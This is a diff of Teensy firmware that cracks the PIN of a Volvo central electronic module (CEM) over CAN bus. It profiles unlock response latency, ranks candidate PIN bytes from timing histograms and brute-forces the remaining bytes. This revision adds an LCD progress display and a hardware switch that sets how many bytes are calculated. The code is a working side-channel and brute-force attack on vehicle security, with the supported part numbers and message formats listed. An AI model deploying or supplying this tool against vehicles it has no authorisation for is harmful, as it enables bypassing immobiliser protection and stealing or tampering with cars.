@@ -12,25 +12,27 @@
 
 #define CALC_BYTES     3     /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
 #define CEM_PN_AUTODETECT    /* comment out for P2 CEM-L on the bench w/o DIM */
-//#define  DUMP_BUCKETS                               /* dump all buckets for debugging */
+//#define  DUMP_BUCKETS      /* dump all buckets for debugging */
 
 /* end of tunable parameters */
 
 #include <stdio.h>
 #include <FlexCAN_T4.h>
+#include <LiquidCrystal.h>
 
 #if !defined(__IMXRT1062__)
-#error Unsupported Teensy model, need 4.0
+#error Unsupported Teensy model, need 4.x
 #endif
 
-int cem_reply_min;
-int cem_reply_avg;
-int cem_reply_max;
+uint32_t cem_reply_min;
+uint32_t cem_reply_avg;
+uint32_t cem_reply_max;
 
 #define AVERAGE_DELTA_MIN     -8  /* buckets to look at before the rolling average */
 #define AVERAGE_DELTA_MAX     12  /* buckets to look at after the rolling average  */
 
-#define CAN_L_PIN    2          /* CAN Rx pin connected to digital pin 2 */
+#define CAN_L_PIN      PIND2     /* CAN Rx pin connected to digital pin 2 */
+#define CALC_BYTES_PIN PIND3     /* calculated bytes selection to digital pin 3 */
 
 #define CAN_500KBPS 500000      /* 500 Kbit speed */
 #define CAN_250KBPS 250000      /* 250 Kbit speed */
@@ -52,21 +54,25 @@ typedef enum {
 
 #define CAN_MSG_SIZE    8       /* messages are always 8 bytes */
 
-#define CEM_HS_ECU_ID      0x50
-#define CEM_LS_ECU_ID      0x40
+#define CEM_HS_ECU_ID   0x50    /* CEM ECU id on the high-speed CAN bus */
+#define CEM_LS_ECU_ID   0x40    /* CEM ECU id on the low-speed CAN bus */
 
 #define PIN_LEN         6       /* a PIN has 6 bytes */
 
-unsigned char  shuffle_orders[4][PIN_LEN] = { { 0, 1, 2, 3, 4, 5 }, { 3, 1, 5, 0, 2, 4 }, {5, 2, 1, 4, 0, 3}, { 2, 4, 5, 0, 3, 1} };
+uint8_t shuffle_orders[4][PIN_LEN] = { { 0, 1, 2, 3, 4, 5 }, { 3, 1, 5, 0, 2, 4 }, {5, 2, 1, 4, 0, 3}, { 2, 4, 5, 0, 3, 1} };
 
-unsigned char *shuffle_order;
+uint8_t *shuffle_order;
+
+/* configuration parameters for known CEM part numbers */
 
 struct _cem_params {
-  unsigned long part_number;
-  int baud;
-  int shuffle;
+  uint32_t part_number;  /* CEM part number */
+  uint32_t baud;         /* baud rate on high-speed bus */
+  uint32_t shuffle;      /* PIN shuffle order */
 } cem_params[] = {
-// P1
+
+/* P1 */
+
   { 8690719,  CAN_500KBPS, 0 },
   { 8690720,  CAN_500KBPS, 0 },
   { 8690721,  CAN_500KBPS, 0 },
@@ -80,7 +86,8 @@ struct _cem_params {
   { 31254903, CAN_500KBPS, 0 },
   { 31296881, CAN_500KBPS, 3 },
 
-// P2 CEM-B (Brick shaped 1999-2004 with K-line)
+/*  P2 CEM-B (Brick shaped 1999-2004 with K-line) */
+
   { 8645716, CAN_250KBPS, 0 },
   { 8645719, CAN_250KBPS, 0 },
   { 8688434, CAN_250KBPS, 0 },
@@ -97,7 +104,8 @@ struct _cem_params {
   { 9469809, CAN_250KBPS, 0 },
   { 8645200, CAN_250KBPS, 0 },
 
-// P2 CEM-L (L shaped and marked L 2005-2014)
+/* P2 CEM-L (L shaped and marked L 2005-2014) */
+
   { 30682981, CAN_500KBPS, 1 },
   { 30682982, CAN_500KBPS, 1 },
   { 30728356, CAN_500KBPS, 1 },
@@ -110,7 +118,8 @@ struct _cem_params {
   { 31314468, CAN_500KBPS, 1 },
   { 31394158, CAN_500KBPS, 1 },
 
-// P2 CEM-H (L shaped and marked H 2005 - 2007)
+/* P2 CEM-H (L shaped and marked H 2005 - 2008) */
+
   { 30786476, CAN_500KBPS, 1 },
   { 30728539, CAN_500KBPS, 1 },
   { 30682982, CAN_500KBPS, 1 },
@@ -135,9 +144,43 @@ typedef struct seq {
 
 sequence_t sequence[100] = { 0 };
 
+/* number of PIN bytes to calculate */
+
+uint32_t calc_bytes = CALC_BYTES;
+
 /* Teensy function to set the core's clock rate */
 
 extern "C" uint32_t set_arm_clock (uint32_t freq);
+
+/* Initialize the LCD library for use with the Hitachi HD44780
+ * controller using the following interface pins:
+ *
+ * LCD RS pin to digital pin 8
+ * LCD Enable pin to digital pin 9
+ * LCD D4 pin to digital pin 4
+ * LCD D5 pin to digital pin 5
+ * LCD D6 pin to digital pin 6
+ * LCD D7 pin to digital pin 7
+ * LCD R/W pin to ground
+ * LCD VSS pin to ground
+ * LCD VCC pin to 5V
+ * LCD VO pin to variable 10K resistor to ground
+ * LCD LCD- to ground
+ * LCD LCD+ to +5V via 1K resistor
+ */
+
+#define	LCD_ROWS 2
+#define LCD_COLS 16
+
+const uint8_t rs = 8, en = 9, d4 = 4, d5 = 5, d6 = 6, d7 = 7;
+LiquidCrystal lcd (rs, en, d4, d5, d6, d7);
+
+#define lcd_printf(x, y, fmt, args...) { \
+        char buf[LCD_COLS + 1]; \
+        snprintf (buf, sizeof(buf), fmt , ## args); \
+        lcd.setCursor (x, y); \
+        lcd.print (buf); \
+        }
 
 /* forward declarations */
 
@@ -195,7 +238,7 @@ volatile bool can_ls_event_msg_available = false;
  * Returns: true if a message was available, false otherwise
  */
 
-bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, bool verbose)
+bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, uint32_t wait, bool verbose)
 {
   uint8_t *pData;
   uint32_t canId = 0;
@@ -207,7 +250,7 @@ bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, boo
 
     /* call FlexCAN_T4's event handler to process queued messages */
 
-    bus == CAN_HS ? can_hs.events() : can_ls.events();
+    bus == CAN_HS ? can_hs.events () : can_ls.events ();
 
     /* check if a message was available and process it */
 
@@ -220,7 +263,7 @@ bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, boo
       pData = msg.buf;
       ret = true;
     } else {
-      delay(1);
+      delay (1);
       wait--;
     }
   } while (!ret && wait);
@@ -236,7 +279,7 @@ bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, boo
     *id = canId;
 
   if (data)
-    memcpy(data, pData, CAN_MSG_SIZE);
+    memcpy (data, pData, CAN_MSG_SIZE);
 
   /* print the message we received */
 
@@ -302,8 +345,8 @@ uint32_t profileCemResponse (void)
 
     /* average calculation is more reliable using random PIN digits */
 
-    for (int j = 0; j < PIN_LEN; j++)
-      pin[j] = binToBcd(random(0, 99));
+    for (uint32_t j = 0; j < PIN_LEN; j++)
+      pin[j] = binToBcd (random (0, 99));
 
     /* try and unlock the CEM with the random PIN */
 
@@ -311,7 +354,7 @@ uint32_t profileCemResponse (void)
 
     /* keep a running total of the average latency */
 
-    cem_reply_avg += latency / clockCyclesPerMicrosecond();
+    cem_reply_avg += latency / clockCyclesPerMicrosecond ();
   }
 
   /* end time in milliseconds */
@@ -329,7 +372,8 @@ uint32_t profileCemResponse (void)
 
   rate = 1e6 / (end - start);
 
-  printf ("1000 pins in %u ms, %u pins/s, average response: %u us, histogram %u to %u us \n", (end - start), rate, cem_reply_avg, cem_reply_min, cem_reply_max);
+  printf ("1000 pins in %u ms, %u pins/s, average response: %u us, histogram %u to %u us \n",
+          (end - start), rate, cem_reply_avg, cem_reply_min, cem_reply_max);
   return rate;
 }
 
@@ -353,22 +397,24 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 
   /* shuffle the PIN and set it in the request message */
 
-  for (int i = 0; i < PIN_LEN; i++)
+  for (uint32_t i = 0; i < PIN_LEN; i++)
     pMsgPin[shuffle_order[i]] = pin[i];
 
   /* maximum time to collect our samples */
 
-  limit = TSC + 2 * 1000 * clockCyclesPerMicrosecond();
+  limit = TSC + 2 * 1000 * clockCyclesPerMicrosecond ();
   intr = false;
 
   /* send the unlock request */
+
   canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);
 
   start = end = TSC;
   while (!intr && TSC < limit) {
+
     /* if the line is high, the CAN bus is either idle or transmitting a bit */
 
-    if (digitalRead(CAN_L_PIN))
+    if (digitalRead (CAN_L_PIN))
       continue;
 
     /* the CAN bus isn't idle, it's the start of the next bit */
@@ -390,7 +436,7 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 
   /* see if anything came back from the CEM */
 
-  canMsgReceive(CAN_HS, &id, reply, 1000, false);
+  canMsgReceive (CAN_HS, &id, reply, 1000, false);
 
   /* return the maximum time between transmissions that we saw on the CAN bus */
 
@@ -408,73 +454,94 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   return reply[2] == 0x00;
 }
 
-unsigned long ecu_read_part_number(can_bus_id_t bus, unsigned char id)
+/*******************************************************************************
+ *
+ * ecu_read_part_number - read the part number for an ECU
+ *
+ * Returns: part number as a 32-bit value
+ */
+
+uint32_t ecu_read_part_number (can_bus_id_t bus, uint8_t id)
 {
   uint32_t _id;
   uint8_t  data[CAN_MSG_SIZE] = { 0xcb, id, 0xb9, 0xf0, 0x00, 0x00, 0x00, 0x00 };
-  uint8_t rcv[CAN_MSG_SIZE];
+  uint8_t  rcv[CAN_MSG_SIZE];
   bool     verbose = true;
-  unsigned long pn = 0;
-  int ret;
-  int i, j = 0;
-  int frame;
+  uint32_t pn = 0;
+  bool     ret;
+  uint32_t i, j = 0;
+  uint32_t frame;
 
-  printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');
+  printf ("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');
+
 yet_again:
-  canMsgSend(bus, 0xffffe, data, verbose);
+  canMsgSend (bus, 0xffffe, data, verbose);
   i = 0;
   j++;
   frame = 0;
+
   if (j > 10)
     return 0;
+
   do {
 again:
     i++;
     if (i > 20)
       goto yet_again;
 
-    ret = canMsgReceive(bus, &_id, rcv, 10, true);
+    ret = canMsgReceive (bus, &_id, rcv, 10, true);
     if (!ret)
       goto again;
+
     _id &= 0xffff;
+
     if (bus == CAN_HS && _id != 0x0003UL)
       goto again;
+
     if (bus == CAN_LS && _id != 0x0003UL && _id != 0x0005UL)
       goto again;
+
     i = 0;
     if (frame == 0 && rcv[0] & 0x80) {
-      pn *= 100; pn += bcdToBin(rcv[5]);
-      pn *= 100; pn += bcdToBin(rcv[6]);
-      pn *= 100; pn += bcdToBin(rcv[7]);
+      pn *= 100; pn += bcdToBin (rcv[5]);
+      pn *= 100; pn += bcdToBin (rcv[6]);
+      pn *= 100; pn += bcdToBin (rcv[7]);
       frame++;
     } else if (frame == 1 && !(rcv[0] & 0x40)) {
-      pn *= 100; pn += bcdToBin(rcv[1]);
+      pn *= 100; pn += bcdToBin (rcv[1]);
       frame++;
     }
-  } while(frame < 2);
+  } while (frame < 2);
 
-  printf ("Part Number: %lu\n", pn);
+  printf ("Part Number: %u\n", pn);
   return pn;
 }
 
-unsigned long ecu_read_part_number_prog(can_bus_id_t bus, unsigned char id)
+/*******************************************************************************
+ *
+ * ecu_read_part_number_prog - read the part number for an ECU in PROG mode
+ *
+ * Returns: part number as a 32-bit value
+ */
+
+uint32_t ecu_read_part_number_prog (can_bus_id_t bus, uint8_t id)
 {
   uint32_t _id;
   uint8_t  data[CAN_MSG_SIZE] = { id, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
   bool     verbose = true;
-  unsigned long pn = 0;
+  uint32_t pn = 0;
 
-  printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');
+  printf ("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');
 
-  canMsgSend(bus, 0xffffe, data, verbose);
-  canMsgReceive(bus, &_id, data, 1000, verbose);
+  canMsgSend (bus, 0xffffe, data, verbose);
+  canMsgReceive (bus, &_id, data, 1000, verbose);
 
-  for (int i = 0; i < 6; i++) {
+  for (uint32_t i = 0; i < 6; i++) {
     pn *= 100;
-    pn += bcdToBin(data[2 + i]);
+    pn += bcdToBin (data[2 + i]);
   }
 
-  printf ("Part Number: %lu\n", pn);
+  printf ("Part Number: %u\n", pn);
   return pn;
 }
 
@@ -485,7 +552,7 @@ unsigned long ecu_read_part_number_prog(can_bus_id_t bus, unsigned char id)
  * Returns: N/A
  */
 
-void can_prog_mode()
+void progModeOn (void)
 {
   uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
   uint32_t time = 5000;
@@ -494,22 +561,23 @@ void can_prog_mode()
 
   printf ("Putting all ECUs into programming mode.\n");
 
-  while(canMsgReceive(CAN_HS, NULL, NULL, 1, false));
+  while (canMsgReceive (CAN_HS, NULL, NULL, 1, false));
 
   /* broadcast a series of PROG mode requests */
 
   while (time > 0) {
     if ((time % 1000) == 0)
-      k_line_keep_alive();
+      k_line_keep_alive ();
 
-    canMsgSend(CAN_HS, 0xffffe, data, verbose);
-    canMsgSend(CAN_LS, 0xffffe, data, verbose);
+    canMsgSend (CAN_HS, 0xffffe, data, verbose);
+    canMsgSend (CAN_LS, 0xffffe, data, verbose);
 
     verbose = false;
     time -= delayTime;
     delay (delayTime);
   }
-  while(canMsgReceive(CAN_HS, NULL, NULL, 1, false));
+
+  while (canMsgReceive (CAN_HS, NULL, NULL, 1, false));
 }
 
 /*******************************************************************************
@@ -537,7 +605,14 @@ void progModeOff (void)
   }
 }
 
-int seq_max_lat(const void *a, const void *b)
+/*******************************************************************************
+ *
+ * seq_max_lat - qsort comparison function
+ *
+ * Returns: compare latencies and return relative difference between two values
+ */
+
+int seq_max_lat (const void *a, const void *b)
 {
   sequence_t *_a = (sequence_t *)a;
   sequence_t *_b = (sequence_t *)b;
@@ -552,56 +627,71 @@ int seq_max_lat(const void *a, const void *b)
  * Returns: N/A
  */
 
-
-void crackPinPosition(uint8_t *pin, uint32_t pos, bool verbose)
+void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 {
-  uint8_t seq[100];
-  int i;
-  int ranges[7]  = { 100, 50, 25,  12,   6,   3,   2 };
-  int samples[7] = { 10,  20, 50, 100, 200, 300, 400 };
+  uint8_t  seq[100];
+  uint32_t i;
+  uint32_t ranges[7]  = { 100, 50, 25,  12,   6,   3,   2 };
+  uint32_t samples[7] = { 10,  20, 50, 100, 200, 300, 400 };
 
   for (i = 0; i < 100; i++) {
-    seq[i] = binToBcd(i);
+    seq[i] = binToBcd (i);
   }
 
   for (i = 0; i < 7; i++) {
-    crack_range(pin, pos, seq, ranges[i], samples[i], verbose);
+    crack_range (pin, pos, seq, ranges[i], samples[i], verbose);
   }
 }
 
-void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bool verbose)
+/*******************************************************************************
+ *
+ * crack_range - attempt to find PIN digit in a range
+ *
+ * Returns: N/A
+ */
+
+void crack_range (uint8_t *pin, uint32_t pos, uint8_t *seq, uint32_t range, uint32_t samples, bool verbose)
 {
-  int len = sizeof(int) * (cem_reply_max - cem_reply_min);
-  uint32_t *histogram = (uint32_t *)malloc(len);
+  uint32_t len = sizeof(int) * (cem_reply_max - cem_reply_min);
+  uint32_t *histogram = (uint32_t *)malloc (len);
   uint32_t latency;
   uint32_t prod;
   uint32_t sum;
-  double std;
-  int pin1, pin2;
-  int i;
-  int k;
-  int xmin = cem_reply_avg + AVERAGE_DELTA_MIN;
-  int xmax = cem_reply_avg + AVERAGE_DELTA_MAX;
+  double   std;
+  uint32_t pin1, pin2;
+  uint32_t i;
+  uint32_t k;
+  uint32_t xmin = cem_reply_avg + AVERAGE_DELTA_MIN;
+  uint32_t xmax = cem_reply_avg + AVERAGE_DELTA_MAX;
 
   /* clear collected latencies */
 
   memset (sequence, 0, sizeof(sequence));
 
-  printf("range %d, samples %d\n", range, samples);
-  printf("candidates short list: ");
-  for (i = 0; i < min(50, range); i++)
-    printf("%02x ", seq[i]);
+  printf ("range %u, samples %u\n", range, samples);
+  printf ("candidates short list: ");
+
+  for (i = 0; i < min (50u, range); i++)
+    printf ("%02x ", seq[i]);
+
   if (50 < range)
-    printf(" (+ %d more)\n", range - 50);
-  printf("\n");
-  printf("                   us: ");
+    printf (" (+ %d more)\n", range - 50);
+
+  printf ("\n");
+  printf ("                   us: ");
+
   for (i = xmin; i < xmax; i++)
-    printf("%5d ", i);
-  printf("\n");
+    printf ("%5d ", i);
+
+  printf ("\n");
 
   /* iterate over all possible values for the PIN digit */
 
   for (pin1 = 0; pin1 < range; pin1++) {
+
+    /* update display spinner */
+
+    lcd_spinner ();
 
     /* set PIN digit */
 
@@ -640,9 +730,9 @@ void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bo
 
       /* collect latency measurements the PIN pair */
 
-      for (int j = 0; j < samples; j++) {
+      for (uint32_t j = 0; j < samples; j++) {
 
-        pin[pos + 2] = range < 100 ? random(100, 255) : binToBcd(j % 100);
+        pin[pos + 2] = range < 100 ? random (100, 255) : binToBcd (j % 100);
 
         /* try and unlock and measure the latency */
 
@@ -650,7 +740,7 @@ void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bo
 
         /* calculate the index into the historgram */
 
-        int idx = latency / clockCyclesPerMicrosecond();
+        uint32_t idx = latency / clockCyclesPerMicrosecond ();
 
         if (idx < cem_reply_min)
           idx = cem_reply_min;
@@ -659,9 +749,14 @@ void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bo
           idx = cem_reply_max - 1;
 
         idx -= cem_reply_min;
+
         /* bump the count for this latency */
 
         histogram[idx]++;
+
+        /* update display spinner */
+
+        lcd_spinner ();
       }
     }
 
@@ -681,7 +776,7 @@ void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bo
       printf ("% 5u ", histogram[k - cem_reply_min]);
 
     for (k = cem_reply_min; k < cem_reply_max; k++) {
-      int l = k - cem_reply_min;
+      uint32_t l = k - cem_reply_min;
       uint32_t h = histogram[l];
 
       if (h) {
@@ -690,15 +785,15 @@ void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bo
       }
     }
 
-    int mean = sum / (xmax - xmin);
+    uint32_t mean = sum / (xmax - xmin);
     long x = 0;
 
     for (k = cem_reply_min; k < cem_reply_max; k++) {
-      int l = k - cem_reply_min;
+      uint32_t l = k - cem_reply_min;
       if (histogram[l])
-        x += sq(histogram[l] - mean);
+        x += sq (histogram[l] - mean);
     }
-    std = sqrt((double)x / (cem_reply_max - cem_reply_min));
+    std = sqrt ((double)x / (cem_reply_max - cem_reply_min));
 
     /* weighted average */
 
@@ -727,23 +822,31 @@ void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bo
 
   qsort (sequence, range, sizeof(sequence_t), seq_max_lat);
 
+  /* update display spinner */
+
+  lcd_spinner ();
+
   /* print the top range/2 latencies and their PIN value */
-  printf("best candidates ordered by latency:\n");
-  for (int i = 0; i < range; i++) {
+
+  printf ("best candidates ordered by latency:\n");
+
+  for (uint32_t i = 0; i < range; i++) {
     printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
   }
-  printf("...\n");
+  printf ("...\n");
 
   for (i = 0; i < range; i++)
     seq[i] = sequence[i].pinValue;
 
   if (range == 2) {
+
     /* set the digit in the overall PIN */
+
     pin[pos] = sequence[0].pinValue;
     printf ("pin[%u] choose candidate: %02x\n", pos, pin[pos]);
   }
 
-  free(histogram);
+  free (histogram);
 }
 
 /*******************************************************************************
@@ -753,7 +856,7 @@ void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bo
  * Returns: N/A
  */
 
-void cemCrackPin (int maxBytes, bool verbose)
+void cemCrackPin (uint32_t maxBytes, bool verbose)
 {
   uint8_t  pin[PIN_LEN];
   uint8_t  pinUsed[PIN_LEN];
@@ -764,13 +867,16 @@ void cemCrackPin (int maxBytes, bool verbose)
   uint32_t crackRate;
   uint32_t remainingBytes;
   bool     cracked = false;
-  int i;
-
-  printf ("Calculating bytes 0-%u\n", maxBytes - 1);
+  uint32_t i;
 
   /* profile the CEM to see how fast it can process requests */
 
+  printf ("Profiling CEM\n");
+  lcd_printf (0, 1, "Profiling CEM   ");
   crackRate = profileCemResponse ();
+
+  printf ("Calculating bytes 0-%u\n", maxBytes - 1);
+  lcd_printf (0, 1, "Bytes 0-%lu       ", maxBytes - 1);
 
   /* start time */
 
@@ -810,6 +916,8 @@ void cemCrackPin (int maxBytes, bool verbose)
   printf (": brute forcing bytes %u to %u (%u bytes), will take up to %u seconds\n",
           maxBytes, PIN_LEN - 1, remainingBytes,
           (uint32_t)(pow (100, remainingBytes) / crackRate));
+
+  lcd_printf (0, 1, "Bytes %lu-%u       ", maxBytes, PIN_LEN - 1);
 
   /* 5% of the remaining PINs to try */
 
@@ -853,6 +961,7 @@ void cemCrackPin (int maxBytes, bool verbose)
 
     if ((i % percent_5) == 0) {
       printf ("%u%%..", percent * 5);
+      lcd_printf (0, 1, "Bytes %lu-%u %lu%%   ", maxBytes, PIN_LEN - 1, percent * 5);
       percent++;
     }
   }
@@ -870,6 +979,7 @@ void cemCrackPin (int maxBytes, bool verbose)
     uint32_t can_id = 0;
 
     printf ("Validating PIN\n");
+    lcd_printf (0, 1, "Validating PIN  ");
 
     /* send the unlock request to the CEM */
 
@@ -888,20 +998,34 @@ void cemCrackPin (int maxBytes, bool verbose)
 
     memset (data, 0, sizeof(data));
 
-    canMsgReceive(CAN_HS, &can_id, data, 10, false);
+    canMsgReceive (CAN_HS, &can_id, data, 10, false);
 
     /* verify the response came from the CEM and is a successful reply to our request */
 
     if ((can_id == 3) &&
       (data[0] == CEM_HS_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00)) {
       printf ("PIN verified.\n");
+
+      lcd_printf (0, 0, "PIN: %02x %02x %02x  ", pinUsed[0], pinUsed[1], pinUsed[2]);
+      lcd_printf (0, 1, "     %02x %02x %02x  ", pinUsed[3], pinUsed[4], pinUsed[5]);
     } else {
       printf ("PIN verification failed!\n");
+
+      lcd_printf (0, 1, "PIN: failed     ");
     }
+  } else {
+      lcd_printf (0, 1, "PIN: not cracked");
   }
 
   printf ("done\n");
 }
+
+/*******************************************************************************
+ *
+ * can_hs_event - called by FlexCAN_T4 when data arrives on the high-speed bus
+ *
+ * Returns: N/A
+ */
 
 void can_hs_event (const CAN_message_t &msg)
 {
@@ -909,31 +1033,52 @@ void can_hs_event (const CAN_message_t &msg)
   can_hs_event_msg_available = true;
 }
 
+/*******************************************************************************
+ *
+ * can_ls_event - called by FlexCAN_T4 when data arrives on the low-speed bus
+ *
+ * Returns: N/A
+ */
+
 void can_ls_event (const CAN_message_t &msg)
 {
   can_ls_event_msg = msg;
   can_ls_event_msg_available = true;
 }
 
-void can_ls_init(int baud)
+/*******************************************************************************
+ *
+ * can_ls_init - FlexCAN_T4 low-speed bus initialization
+ *
+ * Returns: N/A
+ */
+
+void can_ls_init (uint32_t baud)
 {
-  can_ls.begin();
-  can_ls.setBaudRate(baud);
-  can_ls.enableFIFO();
-  can_ls.enableFIFOInterrupt();
-  can_ls.setFIFOFilter(ACCEPT_ALL);
-  can_ls.onReceive(can_ls_event);
+  can_ls.begin ();
+  can_ls.setBaudRate (baud);
+  can_ls.enableFIFO ();
+  can_ls.enableFIFOInterrupt ();
+  can_ls.setFIFOFilter (ACCEPT_ALL);
+  can_ls.onReceive (can_ls_event);
   printf ("CAN low-speed init done.\n");
 }
 
-void can_hs_init(int baud)
+/*******************************************************************************
+ *
+ * can_hs_init - FlexCAN_T4 high-speed bus initialization
+ *
+ * Returns: N/A
+ */
+
+void can_hs_init (uint32_t baud)
 {
-  can_hs.begin();
-  can_hs.setBaudRate(baud);
-  can_hs.enableFIFO();
-  can_hs.enableFIFOInterrupt();
-  can_hs.setFIFOFilter(ACCEPT_ALL);
-  can_hs.onReceive(can_hs_event);
+  can_hs.begin ();
+  can_hs.setBaudRate (baud);
+  can_hs.enableFIFO ();
+  can_hs.enableFIFOInterrupt ();
+  can_hs.setFIFOFilter (ACCEPT_ALL);
+  can_hs.onReceive (can_hs_event);
   printf ("CAN high-speed init done.\n");
 }
 
@@ -949,26 +1094,127 @@ void ext_output1(const CAN_message_t &msg)
   intr = 1;
 }
 
-void k_line_keep_alive()
-{
-  unsigned char msg[] = { 0x84, 0x40, 0x13, 0xb2, 0xf0, 0x03, 0x7c };
+/*******************************************************************************
+ *
+ * k_line_keep_alive - write a message to the K-line to keep it alive
+ *
+ * Returns: N/A
+ */
 
-  Serial3.write(msg, sizeof(msg));
+void k_line_keep_alive ()
+{
+  uint8_t msg[] = { 0x84, 0x40, 0x13, 0xb2, 0xf0, 0x03, 0x7c };
+
+  Serial3.write (msg, sizeof(msg));
 }
 
-bool find_cem_params(unsigned long pn, struct _cem_params *p)
-{
-  int i;
-  int n = sizeof(cem_params) / sizeof(struct _cem_params);
+/*******************************************************************************
+ *
+ * find_cem_params - find CEM parameters based on part number
+ *
+ * Returns: pointer to paramters if CEM is known, NULL otherwise
+ */
 
-  printf("Searching P/N %lu in %d known CEMs\n", pn, n);
+struct _cem_params *find_cem_params (uint32_t pn)
+{
+  uint32_t i;
+  uint32_t n = sizeof(cem_params) / sizeof(struct _cem_params);
+
+  printf ("Searching P/N %u in %d known CEMs\n", pn, n);
+
   for (i = 0; i < n; i++) {
     if (cem_params[i].part_number == pn) {
-      *p = cem_params[i];
-      return true;
+      return &cem_params[i];
     }
   }
-  return false;
+  return NULL;
+}
+
+/*******************************************************************************
+ *
+ * lcd_init - initialze the LCD controller with custom characters
+ *
+ * Returns: N/A
+ */
+
+void lcd_init (void) {
+
+  /* custom characters for use by the spinner */
+
+  const byte char0[8] = {
+        B11100,
+        B11100,
+        B11100,
+        B11100,
+        B00000,
+        B00000,
+        B00000,
+        B00000,
+  };
+  const byte char1[8] = {
+        B00111,
+        B00111,
+        B00111,
+        B00111,
+        B00000,
+        B00000,
+        B00000,
+        B00000,
+  };
+
+  const byte char2[8] = {
+        B00000,
+        B00000,
+        B00000,
+        B00000,
+        B00111,
+        B00111,
+        B00111,
+        B00111,
+  };
+
+  const byte char3[8] = {
+        B00000,
+        B00000,
+        B00000,
+        B00000,
+        B11100,
+        B11100,
+        B11100,
+        B11100,
+  };
+
+  lcd.createChar (0, char0);
+  lcd.createChar (1, char1);
+  lcd.createChar (2, char2);
+  lcd.createChar (3, char3);
+}
+
+/*******************************************************************************
+ *
+ * lcd_spinner - update the spinner on the LCD display
+ *
+ * Returns: N/A
+ */
+
+void lcd_spinner (void) {
+  static uint32_t index = 0;
+  static uint32_t last_update = 0;
+  uint32_t timestamp;
+
+  /* must have at least 500ms between updates */
+
+  timestamp = millis ();
+
+  if ((timestamp - last_update) <  500)
+    return;
+
+  last_update = timestamp;
+
+  lcd.setCursor (15,1);
+  lcd.write (index);
+  index++;
+  index %= 4;
 }
 
 bool initialized = false;
@@ -982,11 +1228,21 @@ bool initialized = false;
 
 void setup (void)
 {
-  bool hs_inited = false;
+
+  /* initialize the LCD display */
+
+  lcd.begin (LCD_COLS, LCD_ROWS);
+  lcd.clear ();
+  lcd.setCursor (0, 0);
+
+  lcd_init ();
+
+  lcd_printf (0, 0, "Initialzing...  ");
+
   /* set up the serial port */
 
-  Serial.begin(115200);
-  Serial3.begin(10800); /* K-Line */
+  Serial.begin (115200);
+  Serial3.begin (10800); /* K-Line */
 
   delay (3000);
 
@@ -999,53 +1255,85 @@ void setup (void)
 
   pinMode (CAN_L_PIN, INPUT_PULLUP);
 
+  /* set up the pin for calculated byte count selection */
+
+  pinMode (CALC_BYTES_PIN, INPUT_PULLUP);
+
+  /* allow time for input pull-up resistors to settle */
+
+  delayMicroseconds (10);
+
+  /* grounded pin calculates fewer PIN bytes */
+
+  if (digitalRead (CALC_BYTES_PIN) == 0)
+      calc_bytes = 2;
+
   set_arm_clock (180000000);
 
+  printf ("Build Date:              %s %s\n", __DATE__, __TIME__);
   printf ("CPU Maximum Frequency:   %u\n", F_CPU);
   printf ("CPU Frequency:           %u\n", F_CPU_ACTUAL);
   printf ("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond ());
-  printf ("PIN bytes to measure:    %u\n", CALC_BYTES);
+  printf ("PIN bytes to measure:    %u\n", calc_bytes);
 
-  long pn = 0;
+  uint32_t pn = 0;
 
 #if defined(CEM_PN_AUTODETECT)
-  can_hs.begin();
-  k_line_keep_alive();
-  delay(1000);
-  can_ls_init(CAN_125KBPS);
-  k_line_keep_alive();
-  pn = ecu_read_part_number(CAN_LS, CEM_LS_ECU_ID);
+  bool hs_inited = false;
 
-  if (!pn) {// might be CEM-L
-    printf("Can't find part number on CAN-LS, trying CAN-HS at 500 Kbps\n");
-    can_hs_init(CAN_500KBPS);
+  can_hs.begin ();
+  k_line_keep_alive ();
+  delay (1000);
+  can_ls_init (CAN_125KBPS);
+  k_line_keep_alive ();
+  pn = ecu_read_part_number (CAN_LS, CEM_LS_ECU_ID);
+
+  if (!pn) {
+
+    /* might be CEM-L */
+
+    printf ("Can't find part number on CAN-LS, trying CAN-HS at 500 Kbps\n");
+    lcd_printf (0, 0, "CAN_LS error    ");
+
+    can_hs_init (CAN_500KBPS);
     hs_inited = true;
-    pn = ecu_read_part_number(CAN_HS, CEM_HS_ECU_ID);
+    pn = ecu_read_part_number (CAN_HS, CEM_HS_ECU_ID);
   }
 #else
-  can_ls_init(CAN_125KBPS);
-  can_hs_init(CAN_500KBPS);
-  can_prog_mode();
-  pn = ecu_read_part_number_prog(CAN_HS, CEM_HS_ECU_ID);
+  can_ls_init (CAN_125KBPS);
+  can_hs_init (CAN_500KBPS);
